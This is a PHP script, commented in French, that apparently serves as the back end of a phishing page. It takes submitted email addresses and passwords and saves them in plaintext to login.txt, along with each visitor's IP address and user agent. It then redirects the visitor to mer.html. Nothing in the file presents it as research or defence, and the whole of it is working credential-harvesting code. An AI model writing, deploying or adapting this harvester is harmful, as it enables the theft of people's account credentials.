<?php
// Activer l'affichage des erreurs pour le débogage
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupération des données essentielles
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');

    // Validation
    if (empty($email) || empty($password)) {
        die(json_encode(['error' => 'Email et mot de passe requis']));
    }

    // Formatage des données
    $logEntry = "=== CONNEXION ===\n";
    $logEntry .= "Date: $date\n";
    $logEntry .= "Email: ".htmlspecialchars($email)."\n";
    $logEntry .= "Mot de passe: ".htmlspecialchars($password)."\n";
    $logEntry .= "Adresse IP: $ip\n";
    $logEntry .= "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
    $logEntry .= "========================\n\n";

    // Chemin du fichier (avec vérification)
    $logFile = __DIR__.'/login.txt';
    
    // Debug: Afficher le chemin du fichier
    echo "<!-- Chemin du fichier: $logFile -->\n";
    
    try {
        // Créer le fichier s'il n'existe pas
        if (!file_exists($logFile)) {
            if (file_put_contents($logFile, '') === false) {
                throw new Exception("Impossible de créer le fichier");
            }
            chmod($logFile, 0644);
            echo "<!-- Fichier créé avec succès -->\n";
        }

        // Vérifier les permissions
        if (!is_writable($logFile)) {
            throw new Exception("Permissions insuffisantes: ".substr(sprintf('%o', fileperms($logFile)), -4));
        }

        // Écriture avec vérification
        $bytesWritten = file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
        
        if ($bytesWritten === false) {
            throw new Exception("Échec de l'écriture dans le fichier");
        }

        echo "<!-- Bytes écrits: $bytesWritten -->\n";
        
        // Redirection en cas de succès
        header("Location: mer.html");
        exit();

    } catch (Exception $e) {
        // Journalisation détaillée
        $errorMsg = "[" . date('Y-m-d H:i:s') . "] Erreur: " . $e->getMessage() . 
                   " - IP: $ip - Chemin: " . realpath($logFile) . 
                   " - Permission: " . (is_writable($logFile) ? 'oui' : 'non');
        error_log($errorMsg);
        
        // Debug output
        echo "<!-- $errorMsg -->\n";
        
        // Message d'erreur
        header("HTTP/1.1 500 Erreur serveur");
        die("Erreur lors du traitement. Veuillez réessayer.");
    }
} else {
    header("HTTP/1.1 403 Forbidden");
    die("Méthode non autorisée");
}
